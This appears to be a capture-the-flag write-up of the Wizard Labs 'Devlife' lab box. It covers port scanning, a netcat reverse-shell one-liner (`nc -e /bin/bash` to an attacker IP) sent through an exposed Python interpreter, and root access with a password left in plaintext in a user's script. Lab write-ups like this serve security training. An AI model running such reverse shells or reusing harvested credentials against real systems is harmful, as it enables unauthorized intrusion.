### Quick Summary
#### Hey guys this is my write-up about Devlife from Wizard Labs which is their second box to retire. Just like [dummy](/wizard-labs/dummy/) it's another easy box (Difficulty : 2/10) , It's a linux box and its ip is `10.1.1.20` so let's jump right in !

### Nmap
#### We will start with nmap to scan for open ports and services : 
`nmap -sV -sT -sC 10.1.1.20`
![](/images/wizardlabs/devlife/1.png)
#### Only 2 ports are open , 22 running ssh and 80 running http. Let's check http.
<hr>
### HTTP Initial Enumeration
#### On the main page we get this "About me" message and nothing else :

### Getting user
#### So I checked `/dev` and found this `Online Python 2.7 Interpreter` :

#### Great , now we can get a reverse shell in many ways , I just imported `os` then did `os.system(reverse shell payload)` :
`import os;os.system('nc -e /bin/bash 10.xx.xx.xx 1337')`

### Stored root Credentials , Privilege Escalation
#### In the `/home` directory of `tedd` there is a directory called `.env` , Let's check that.

#### We notice a python script called `su.py` , which runs `su root` and uses the password to authenticate :
![](/images/wizardlabs/devlife/8.png)
```
import pexpect
child = pexpect.spawn('su root')
child.expect ('Password:')
child.sendline('teddyxy2019')
child.expect('\$')
child.sendline('whoami')
```
#### Now we can `su` to root using the password `teddyxy2019` :

#### And we owned root !
